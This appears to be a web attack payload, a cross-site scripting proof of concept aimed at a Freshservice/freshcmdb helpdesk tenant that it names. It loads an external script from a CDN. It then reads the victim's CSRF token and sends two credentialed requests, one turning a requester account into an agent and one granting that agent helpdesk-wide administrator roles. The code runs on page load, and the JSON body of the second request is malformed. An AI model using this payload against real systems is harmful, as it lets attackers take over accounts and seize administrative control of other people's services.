<script src="https://cdn.jsdelivr.net/gh/mnfre/sampleProject@main/a.js"></script>


async function sendRequests() {
    try {
        // First step call Csrf-Token by create variable and used var name in the headers
        const csrfToken = document.querySelector('meta[name="csrf-token"]').getAttribute('content');

        // Execute POST request that convert requester ==> Agent 
        await fetch('https://akfinfocity09090208.freshcmdb.com/itil/requesters/18443193/make_agent', {
            method: 'POST',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded',
                'X-Csrf-Token': csrfToken
            },
            body: '_method=put'
        });

        // Execute PUT request that convert Agent ==> account admin
        await fetch('https://akfinfocity09090208.freshcmdb.com/api/_/agents/18443193/map_workspace_groups_and_roles', {
            method: 'PUT',
            credentials: 'include',
            headers: {
                'Content-Type': 'application/json',
                'X-Csrf-Token': csrfToken
            },
            body: `{"observer_of":[],"member_of":[],"roles":[{"role_id":18498051,"assignment_scope":"entire_helpdesk"},{"role_id":18498052,"assignment_scope":"entire_helpdesk"},"workspace_id":2}`
        });

        console.log('Requests completed successfully');
    } catch (error) {
        console.error('Error:', error);
    }
}

sendRequests();
